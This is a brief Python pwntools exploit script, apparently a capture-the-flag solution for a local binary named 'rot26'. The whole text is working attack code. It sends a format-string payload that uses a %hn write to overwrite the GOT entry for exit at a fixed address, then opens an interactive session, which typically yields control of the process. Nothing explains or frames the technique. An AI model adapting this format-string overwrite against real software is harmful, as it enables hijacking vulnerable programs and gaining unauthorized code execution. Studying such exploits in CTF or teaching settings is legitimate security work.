from pwn import *

p = process("./rot26")
exit = p32(0x804a020)
payload = "%34615x%7$hn"
p.sendline(exit+payload)
p.interactive()
